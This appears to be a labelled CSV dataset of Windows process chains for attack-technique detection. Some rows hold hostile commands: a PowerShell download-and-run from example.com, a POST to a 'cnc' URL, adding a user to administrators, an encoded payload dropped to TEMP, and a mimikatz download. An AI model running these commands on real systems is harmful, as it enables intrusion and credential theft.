"text","labels"
"(C:\\\\Windows\\\\System32\\\\services.exe)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" -R)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" -z)   (C:\\\\Windows\\\\System32\\\\conhost.exe C:\\\\Windows\\\\system32\\\\conhost.exe --headless --width 206 --height 58 --signal 0x1e0 -- """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""c:\\\\windows\\\\system32\\\\cmd.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""")   (C:\\\\Windows\\\\System32\\\\cmd.exe c:\\\\windows\\\\system32\\\\cmd.exe)   (C:\\\\Windows\\\\System32\\\\net.exe net  user)","""8;6;9"""
"(C:\\\\Windows\\\\System32\\\\services.exe)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" -R)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" -z)   (C:\\\\Windows\\\\System32\\\\conhost.exe C:\\\\Windows\\\\system32\\\\conhost.exe --headless --width 206 --height 58 --signal 0x1e0 -- """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""c:\\\\windows\\\\system32\\\\cmd.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""")","""8;6"""
"(C:\\\\Windows\\\\System32\\\\services.exe)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" -R)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" -z)   (C:\\\\Windows\\\\System32\\\\conhost.exe C:\\\\Windows\\\\system32\\\\conhost.exe --headless --width 206 --height 58 --signal 0x1e0 -- """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""c:\\\\windows\\\\system32\\\\cmd.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""")   (C:\\\\Windows\\\\System32\\\\cmd.exe c:\\\\windows\\\\system32\\\\cmd.exe)","""8;6"""
"(C:\\\\Windows\\\\System32\\\\services.exe)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" -R)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" -z)   (C:\\\\Windows\\\\System32\\\\conhost.exe C:\\\\Windows\\\\system32\\\\conhost.exe --headless --width 206 --height 58 --signal 0x1e0 -- """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""c:\\\\windows\\\\system32\\\\cmd.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""")   (C:\\\\Windows\\\\System32\\\\cmd.exe c:\\\\windows\\\\system32\\\\cmd.exe)   (C:\\\\Windows\\\\System32\\\\net.exe net  user)   (C:\\\\Windows\\\\System32\\\\net1.exe C:\\\\Windows\\\\system32\\\\net1  user)","""8;6;9"""
"(powershell -ExecutionPolicy Bypass -File Trigger_killchain.ps1)   (""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" powershell -Command IEX (New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1'))","""7;10;11;12"""
"(powershell  -ExecutionPolicy Bypass -File Trigger_killchain.ps1)   (""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" powershell -Command Start-Sleep -Seconds 10; Invoke-WebRequest -Uri 'http://example.com/cnc' -Method POST )   (""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" -Command Start-Sleep -Seconds 10)","""7;13"""
"(C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""" -R)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""" -z)   (C:\\\\Windows\\\\System32\\\\conhost.exe C:\\\\Windows\\\\system32\\\\conhost.exe --headless --width 120 --height 30 --signal 0x1d0 -- """"""""""""""""""""""""""""""""c:\\\\windows\\\\system32\\\\cmd.exe"""""""""""""""""""""""""""""""")   (C:\\\\Windows\\\\System32\\\\cmd.exe c:\\\\windows\\\\system32\\\\cmd.exe)   (C:\\\\Windows\\\\System32\\\\PING.EXE ping  140.123.105.250)","""8;6;16"""
"(C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""" -R)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""" -z)   (C:\\\\Windows\\\\System32\\\\conhost.exe C:\\\\Windows\\\\system32\\\\conhost.exe --headless --width 120 --height 30 --signal 0x1d0 -- """"""""""""""""""""""""""""""""c:\\\\windows\\\\system32\\\\cmd.exe"""""""""""""""""""""""""""""""")   (C:\\\\Windows\\\\System32\\\\cmd.exe c:\\\\windows\\\\system32\\\\cmd.exe)   (C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  Get-process)","""6;7;8;16;3"""
"(C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""" -R)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""" -z)   (C:\\\\Windows\\\\System32\\\\conhost.exe C:\\\\Windows\\\\system32\\\\conhost.exe --headless --width 120 --height 30 --signal 0x1d0 -- """"""""""""""""""""""""""""""""c:\\\\windows\\\\system32\\\\cmd.exe"""""""""""""""""""""""""""""""")   (C:\\\\Windows\\\\System32\\\\cmd.exe c:\\\\windows\\\\system32\\\\cmd.exe)   (C:\\\\Windows\\\\System32\\\\mmc.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\system32\\\\mmc.exe"""""""""""""""""""""""""""""""" """"""""""""""""""""""""""""""""C:\\\\Windows\\\\system32\\\\gpedit.msc"""""""""""""""""""""""""""""""" )","""8;6;17"""
"(C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""" -R)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""" -z)   (C:\\\\Windows\\\\System32\\\\conhost.exe C:\\\\Windows\\\\system32\\\\conhost.exe --headless --width 120 --height 30 --signal 0x1d0 -- """"""""""""""""""""""""""""""""c:\\\\windows\\\\system32\\\\cmd.exe"""""""""""""""""""""""""""""""")   (C:\\\\Windows\\\\System32\\\\cmd.exe c:\\\\windows\\\\system32\\\\cmd.exe)   (C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  gpedit.msc)   (C:\\\\Windows\\\\System32\\\\mmc.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\system32\\\\mmc.exe"""""""""""""""""""""""""""""""" """"""""""""""""""""""""""""""""C:\\\\Windows\\\\system32\\\\gpedit.msc"""""""""""""""""""""""""""""""" )","""8;6;7;17"""
"(C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""" -R)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""" -z)   (C:\\\\Windows\\\\System32\\\\conhost.exe C:\\\\Windows\\\\system32\\\\conhost.exe --headless --width 120 --height 30 --signal 0x1d0 -- """"""""""""""""""""""""""""""""c:\\\\windows\\\\system32\\\\cmd.exe"""""""""""""""""""""""""""""""")   (C:\\\\Windows\\\\System32\\\\cmd.exe c:\\\\windows\\\\system32\\\\cmd.exe)   (C:\\\\Windows\\\\System32\\\\HOSTNAME.EXE hostname)","""8;6;2"""
"(C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""" -R)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""" -z)   (C:\\\\Windows\\\\System32\\\\conhost.exe C:\\\\Windows\\\\system32\\\\conhost.exe --headless --width 206 --height 58 --signal 0x1d0 -- """"""""""""""""""""""""""""""""c:\\\\windows\\\\system32\\\\cmd.exe"""""""""""""""""""""""""""""""")   (C:\\\\Windows\\\\System32\\\\cmd.exe c:\\\\windows\\\\system32\\\\cmd.exe)   (C:\\\\Windows\\\\System32\\\\net.exe net  localgroup administrators)   (C:\\\\Windows\\\\System32\\\\net1.exe C:\\\\Windows\\\\system32\\\\net1  localgroup administrators)","""8;6;4"""
"(C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""" -R)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""" -z)   (C:\\\\Windows\\\\System32\\\\conhost.exe C:\\\\Windows\\\\system32\\\\conhost.exe --headless --width 206 --height 58 --signal 0x1d0 -- """"""""""""""""""""""""""""""""c:\\\\windows\\\\system32\\\\cmd.exe"""""""""""""""""""""""""""""""")   (C:\\\\Windows\\\\System32\\\\cmd.exe c:\\\\windows\\\\system32\\\\cmd.exe)   (C:\\\\Windows\\\\System32\\\\net.exe net  localgroup administrators user /add)   (C:\\\\Windows\\\\System32\\\\net1.exe C:\\\\Windows\\\\system32\\\\net1  localgroup administrators user /add)","""8;6;32"""
"(C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""" -R)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""" -z)   (C:\\\\Windows\\\\System32\\\\conhost.exe C:\\\\Windows\\\\system32\\\\conhost.exe --headless --width 206 --height 58 --signal 0x1cc -- """"""""""""""""""""""""""""""""c:\\\\windows\\\\system32\\\\cmd.exe"""""""""""""""""""""""""""""""")   (C:\\\\Windows\\\\System32\\\\cmd.exe c:\\\\windows\\\\system32\\\\cmd.exe)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\ssh.exe ssh  140.123.105.246)","""8;6"""
"(C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""" -R)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\OpenSSH\\\\sshd.exe"""""""""""""""""""""""""""""""" -z)   (C:\\\\Windows\\\\System32\\\\conhost.exe C:\\\\Windows\\\\system32\\\\conhost.exe --headless --width 206 --height 58 --signal 0x1cc -- """"""""""""""""""""""""""""""""c:\\\\windows\\\\system32\\\\cmd.exe"""""""""""""""""""""""""""""""")   (C:\\\\Windows\\\\System32\\\\cmd.exe c:\\\\windows\\\\system32\\\\cmd.exe)   (C:\\\\Windows\\\\System32\\\\OpenSSH\\\\ssh.exe ssh  Mark@140.123.105.150)","""8;6"""
"(C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.WindowsTerminal_1.0.1401.0_x64__8wekyb3d8bbwe\\\\WindowsTerminal.exe)   (C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell.exe)   (C:\\\\Windows\\\\System32\\\\rundll32.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\rundll32.exe"""""""""""""""""""""""""""""""" C:\\\\Users\\\\admin\\\\AppData\\\\agent.dll,xyz)   (C:\\\\Windows\\\\SysWOW64\\\\rundll32.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\System32\\\\rundll32.exe"""""""""""""""""""""""""""""""" C:\\\\Users\\\\admin\\\\AppData\\\\agent.dll,xyz)   (C:\\\\Windows\\\\SysWOW64\\\\rundll32.exe rundll32.exe)","""7;11"""
"(C:\Windows\System32\services.exe) -> (C:\Windows\System32\OpenSSH\sshd.exe C:\Windows\System32\OpenSSH\sshd.exe) -> (C:\Windows\System32\OpenSSH\sshd.exe ""C:\Windows\System32\OpenSSH\sshd.exe"" -R) -> (C:\Windows\System32\OpenSSH\sshd.exe ""C:\Windows\System32\OpenSSH\sshd.exe"" -z) -> (C:\Windows\System32\conhost.exe C:\Windows\system32\conhost.exe --headless --width 206 --height 58 --signal 0x1e0 -- "c:\windows\system32\cmd.exe") -> (C:\Windows\System32\cmd.exe c:\windows\system32\cmd.exe) -> (C:\Windows\System32\cmd.exe c:\windows\system32\cmd.exe) -> (C:\Windows\System32\net.exe net user)","6;8;9"
"(C:\Windows\System32\services.exe) -> (C:\Windows\System32\OpenSSH\sshd.exe C:\Windows\System32\OpenSSH\sshd.exe) -> (C:\Windows\System32\OpenSSH\sshd.exe ""C:\Windows\System32\OpenSSH\sshd.exe"" -R) -> (C:\Windows\System32\OpenSSH\sshd.exe ""C:\Windows\System32\OpenSSH\sshd.exe"" -z) -> (C:\Windows\System32\conhost.exe C:\Windows\system32\conhost.exe --headless --width 206 --height 58 --signal 0x1e0 -- "c:\windows\system32\cmd.exe") -> (C:\Windows\System32\cmd.exe c:\windows\system32\cmd.exe) -> (C:\Windows\System32\cmd.exe c:\windows\system32\cmd.exe) -> (C:\Windows\System32\net1.exe net user)","6;8;9"
"(C:\Windows\System32\services.exe) -> (C:\Windows\System32\OpenSSH\sshd.exe C:\Windows\System32\OpenSSH\sshd.exe) -> (C:\Windows\System32\OpenSSH\sshd.exe ""C:\Windows\System32\OpenSSH\sshd.exe"" -R) -> (C:\Windows\System32\OpenSSH\sshd.exe ""C:\Windows\System32\OpenSSH\sshd.exe"" -z) -> (C:\Windows\System32\conhost.exe C:\Windows\system32\conhost.exe --headless --width 206 --height 58 --signal 0x1e0 -- "c:\windows\system32\cmd.exe") -> (C:\Windows\System32\cmd.exe c:\windows\system32\cmd.exe) -> (C:\Windows\System32\cmd.exe c:\windows\system32\cmd.exe) -> (C:\Windows\System32\net1.exe net1 user)","6;8;9"
"(C:\Windows\System32\services.exe) -> (C:\Windows\System32\OpenSSH\sshd.exe C:\Windows\System32\OpenSSH\sshd.exe) -> (C:\Windows\System32\OpenSSH\sshd.exe ""C:\Windows\System32\OpenSSH\sshd.exe"" -R) -> (C:\Windows\System32\OpenSSH\sshd.exe ""C:\Windows\System32\OpenSSH\sshd.exe"" -z) -> (C:\Windows\System32\conhost.exe C:\Windows\system32\conhost.exe --headless --width 206 --height 58 --signal 0x1e0 -- "c:\windows\system32\cmd.exe") -> (C:\Windows\System32\cmd.exe c:\windows\system32\cmd.exe) -> (C:\Windows\System32\cmd.exe c:\windows\system32\cmd.exe) -> (C:\Windows\System32\net.exe net1 user)","6;8;9"
"(C:\Windows\System32\services.exe) -> (C:\Windows\System32\OpenSSH\sshd.exe C:\Windows\System32\OpenSSH\sshd.exe) -> (C:\Windows\System32\OpenSSH\sshd.exe ""C:\Windows\System32\OpenSSH\sshd.exe"" -R) -> (C:\Windows\System32\OpenSSH\sshd.exe ""C:\Windows\System32\OpenSSH\sshd.exe"" -z) -> (C:\Windows\System32\conhost.exe C:\Windows\system32\conhost.exe --headless --width 206 --height 58 --signal 0x1e0 -- "c:\windows\system32\cmd.exe") -> (C:\Windows\System32\cmd.exe c:\windows\system32\cmd.exe) -> (C:\Windows\System32\cmd.exe c:\windows\system32\cmd.exe) -> (C:\Windows\System\net.exe net1 user)","6;8;9"
"(C:\Windows\System32\net.exe net1 user)"," "
"(C:\Windows\System32\net.exe net user)"," "
"(C:\Windows\System32\net1.exe net user)"," "
"(C:\Windows\System32\net1.exe net1 user)"," "
"(C:\Windows\System\net.exe net user)"," "
"(C:\\\\Windows\\\\System32\\\\svchost.exe)   (C:\\\\Windows\\\\System32\\\\consent.exe consent.exe 7460 426 0000024F37CAEE30)","""19"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe)   (C:\\\\Windows\\\\System32\\\\consent.exe consent.exe 7460 330 0000024F37CB01B0)","""19"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe)   (C:\\\\Windows\\\\System32\\\\consent.exe consent.exe 7460 426 0000024F37CE7210)","""19"""
"(C:\\\\Windows\\\\explorer.exe)   (C:\\\\Program Files\\\\Wireshark\\\\Wireshark.exe """"""""""""""""""""""""""""""""C:\\\\Program Files\\\\Wireshark\\\\Wireshark.exe"""""""""""""""""""""""""""""""")   (C:\\\\Program Files\\\\Wireshark\\\\dumpcap.exe """"""""""""""""""""""""""""""""C:\\\\Program Files\\\\Wireshark\\\\dumpcap.exe"""""""""""""""""""""""""""""""" -n -i \\\\Device\\\\NPF_{7D87EFF0-E43E-4BD9-8604-836EA49D0568} -y EN10MB -Z 8168)","""20"""
"(C:\\\\Windows\\\\explorer.exe)   (C:\\\\Windows\\\\System32\\\\mmc.exe """"""""""""""""""""""""""""""""C:\\\\Windows\\\\system32\\\\mmc.exe"""""""""""""""""""""""""""""""" """"""""""""""""""""""""""""""""C:\\\\Windows\\\\system32\\\\eventvwr.msc"""""""""""""""""""""""""""""""" /s)","""19;17"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) (\\\\Device\\\\Mup\\\\VBoxSvr\\\\Users\\\\bouss\\\\Downloads\\\\MalSeclogon-master\\\\x64\\\\Debug\\\\MalSeclogon.exe None)","""11"""
"(C:\\\\Windows\\\\System32\\\\lsass.exe)   (\\\\Device\\\\Mup\\\\VBoxSvr\\\\Users\\\\bouss\\\\Downloads\\\\MalSeclogon-master\\\\x64\\\\Debug\\\\MalSeclogon.exe None)  (C:\\\\Windows\\\\System32\\\\conhost.exe None)","""22;6"""
"(C:\\\\Windows\\\\System32\\\\AtBroker.exe None)","""37"""
"(C:\\\\Users\\\\user01\\\\Desktop\\\\plink.exe None)","""8"""
"(C:\\\\Windows\\\\System32\\\\slui.exe None)","""19"""
"(C:\\\\Windows\\\\System32\\\\UI0Detect.exe None)","""37"""
"(C:\\\\Windows\\\\System32\\\\rundll32.exe None)","""10"""
"(C:\\\\Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe None)","""23"""
"(C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe None)","""23"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe None)","""6"""
"(C:\\\\Windows\\\\System32\\\\tasklist.exe None)","""3"""
"(C:\\\\Python27\\\\python.exe None)","""26"""
"(C:\\\\Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe)   (C:\\\\Windows\\\\System32\\\\notepad.exe None)","""23"""
"(C:\\\\Program Files\\\\Microsoft SQL Server\\\\MSSQL12.RADAR\\\\MSSQL\\\\Binn\\\\sqlservr.exe) -> (C:\\\\Windows\\\\System32\\\\cmd.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\cmd.exe"""""""""""""""" /c echo //+LXQiLFYAwQAAHfRBnA+wwLwPHQBQAAAAAi3yJUQShyMCOAIsLg8xAiUEIi6+NDL3mAJcAx6Eg7gIMAIsDUVaJkRjoSO//mot1FI0MvQAOagCJTaiL0Yv4wekC89yIyoPhA/Oki29fXolBHIsTi00M1KYcxxkBAAAAAIsxeQEAAADHQiQAAAAAi9mJQQwdEylCaosLW4neLDPAXcIQ/5BVi+xW4nUIV4tGFIXAtgiLRiCAOAB1TzxODItGGDv7x1YUAAAAALgki1ayiwSkiUYggDhndRaKUAFAhNJ0KInMIIoQgPotdR5BiU4Mx0Yg1PYUAJhNEIqHEF9eiAG4fhEBAF2zEACLViCLricPvgJCg/g6iZEQiVYXD3LQAAAAUN//FXzBQACDxHuFwA+EvQAAAICyATp0GotNFMcBAAAAAItWIF06AA9wkn0AAOmKAAAAi0ZygDgAdAeLsRRbARl0i5b/i04PiYvCg1YMO8h/ncdGINT1QQA8Bwk6dROLRRCK3hBfsIgQuH0RAQBdwhDYi0YEhcA2H4tWHMdOELnBAlDoCUkAAItOzVBo6PNAADb/VgSDNhCLRRCKAhBXW4gQuHwRTQBdwhAAi04cixSBA0UHiRDHRiDUAkGlhEYMi1UQik4QX8zAiApeWMLiAIN+EC0PhPrG//+LCOH1OgCJA/9GDItGBIXAs1YZPyu+H9VOHA5GEFCLEVLFkUgAcFCLRgggzPNAAKz/PQSDxNaLVRAIThCO7nyRAQCICl5dwhDlkJCQkJCQ++eQkLCQkJBVi+xRVrTo8QEAAIXAD4X9AAAAgz3cCEEAFA+MIQAAAHWExYkAZ8CNheEAACrHBYQDF2oBAILJVBVcwEAAi/Cv9nRQ8VgDQQBxwHUdDspy9EAAUQTox0sfo4PEDKNYA0EAhcAPhK8AAACNafxRVorQi/CF9nSAizH8i0UMUlZQ6IRIAACLTQiDxAxTiQu9FUTAQABT/3BawNAAi94w/1P/FSTBQABQ6IUAAACLlSeDxFuF/3R4jTSFUAAAAGqbFVzBQACDxM6JB/8VJPVAAItZ14FGMIvRwekC86WLQoPhA73OHv8VysBAAIt9KH5AAP/WiwgDhcl0Fv+6i2b//1XHwgAA7QD/FTDBQACDxKEzwF9e7+VdwgwATgEHFUyfQCLpbv//9JCQkJCQkJCQkJCQVYtxUYtFDFOLWBBWhdvTfRjSAQB5AGaDOAB1sWbUeALudAbbg8AC6+ArmgyDwALRS4lFELcEnQQAAGpQttjmwUAAi/iLRRCQdEABVol1/P8VXLxAAIPECI1NqIkHjVXRUVCLRUACMeg06AAAi/Bmiwcr8lZQaxUgwVv9uQFyAEB5xKg7MokHlSk6Wv+NRwSJTQxBi1D8ysICiaPVMAkWRoTSiQ119cJVDIPABEqJVQwakotqCMcESwAAAB2JOF+Lw15bi+Vdw5D4kJCQkJCQkFWL>>%TEMP%\\\\feyQV.b64'.strip())","""30"""
"(C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe) -> (C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe """"""""""""""""C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe"""""""""""""""" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --field-trial-handle=2000,7126420810095964733,2611010335910673961,131072 --disable-gpu-compositing --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=14 --mojo-platform-channel-handle=5856 /prefetch:1'.strip())","""31"""
"(C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe) -> (C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe """"""""""""""""C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe"""""""""""""""" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --field-trial-handle=2000,7126420810095964733,2611010335910673961,131072 --disable-gpu-compositing --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=16 --mojo-platform-channel-handle=4376 /prefetch:1'.strip())","""31"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe """"""""""""""""C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe""""""""""""""""  https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip '.strip())","""31"""
